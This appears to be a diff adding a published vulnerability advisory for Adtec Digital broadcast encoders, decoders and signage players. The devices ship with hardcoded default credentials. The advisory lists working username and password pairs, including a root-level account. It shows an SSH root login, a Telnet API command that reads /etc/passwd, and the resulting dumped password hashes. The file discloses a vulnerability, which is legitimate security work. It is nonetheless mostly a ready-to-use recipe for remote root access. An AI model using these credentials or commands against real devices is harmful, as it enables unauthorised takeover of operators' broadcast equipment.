@@ -1,0 +1,108 @@
+# Exploit Title: Adtec Digital Multiple Products - Default Hardcoded Credentials Remote Root
+# Date: 2020-07-24
+# Exploit Author: LiquidWorm
+# Software Link: https://www.adtecdigital.com / https://www.adtecdigital.com/support/documents-downloads
+# Version: Multiple
+
+Adtec Digital Multiple Products - Default Hardcoded Credentials Remote Root
+
+
+Vendor: Adtec Digital, Inc.
+Product web page: https://www.adtecdigital.com
+                  https://www.adtecdigital.com/support/documents-downloads
+Affected version: SignEdje Digital Signage Player v2.08.28
+                  mediaHUB HD-Pro High & Standard Definition MPEG2 Encoder v3.07.19
+                  afiniti Multi-Carrier Platform v1905_11
+                  EN-31 Dual Channel DSNG Encoder / Modulator v2.01.15
+                  EN-210 Multi-CODEC 10-bit Encoder / Modulator v3.00.29
+                  EN-200 1080p AVC Low Latency Encoder / Modulator v3.00.29
+                  ED-71 10-bit / 1080p Integrated Receiver Decoder v2.02.24
+                  edje-5110 Standard Definition MPEG2 Encoder v1.02.05
+                  edje-4111 HD Digital Media Player v2.07.09
+                  Soloist HD-Pro Broadcast Decoder v2.07.09
+                  adManage Traffic & Media Management Application v2.5.4
+
+Summary: Adtec Digital is a leading manufacturer of Broadcast, Cable and IPTV products and
+solutions.
+
+Desc: The devices utilizes hard-coded and default credentials within its Linux distribution
+image for Web/Telnet/SSH access. A remote attacker could exploit this vulnerability by logging
+in using the default credentials for accessing the web interface or gain shell access as root.
+
+Tested on: GNU/Linux 4.1.8 (armv7l)
+           GNU/Linux 3.12.38 (PowerPC)
+           GNU/Linux 2.6.14 (PowerPC)
+           Adtec Embedded Linux 0.9 (fido)
+           Apache
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5603
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5603.php
+
+
+24.07.2020
+
+--
+
+
+Creds:
+------
+
+adtec:none:500:1000:adtec:/media:/bin/sh
+admin:1admin!:502:502:admin:/home/admin:/bin/sh
+root1:1root!:0:0:root:/root:/bin/sh
+adtecftp:adtecftp2231
+
+
+SSH:
+----
+
+login as: root
+root@192.168.3.12's password:
+
+Successfully logged in.
+Thank you for choosing Adtec Digital products-
+we know you had a choice and we appreciate your decision!
+
+root@targethostname:~# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+--
+admin@targethostname:/$ id
+uid=502(admin) gid=502(admin) groups=0(root),502(admin)
+admin@targethostname:~$ id adtec
+uid=500(adtec) gid=1000(users) groups=1000(users),72(apache)
+admin@targethostname:~$ cat /etc/sudoers |grep -v "#"
+root    ALL=(ALL) ALL
+apache ALL=(ALL) NOPASSWD: ALL
+
+
+Telnet (API):
+-------------
+
+Adtec Resident Telnet Server...
+UserName:
+adtec
+adtec
+PassWord:
+none
+User adtec connected
+*.SYSD SHELLCMD cat /etc/passwd
+*.SYSD CMD cat /etc/passwd
+OK
+root:he7TRuXjJjxfc:0:0:root:/root:/bin/sh
+adtec:GC1BpYa80PaoY:500:1000:adtec:/media:/bin/sh
+apache:!!:72:72:Apache Server:/dev/null:/sbin/nologin
+fregd:!!:73:73:Freg Daemon:/dev/null:/sbin/nologin
+ntp:!!:38:38:NTP Server:/dev/null:/sbin/nologin
+syslogd:!!:74:74:Syslog Daemon:/dev/null:/sbin/nologin
+admin:rDglOB38TVYRg:502:502:admin:/home/admin:/bin/sh
+sshd:x:71:65:SSH daemon:/var/lib/sshd:/bin/false
+avahi:x:82:82:Avahi Daemon:/dev/null/:/sbin/nologin
+avahi-autoipd:x:83:83:Avahi Autoipd:/dev/null/:/sbin/nologin
+messagebus:x:81:81:Message Bus Daemon:/dev/null:/sbin/nologin
+...
+...
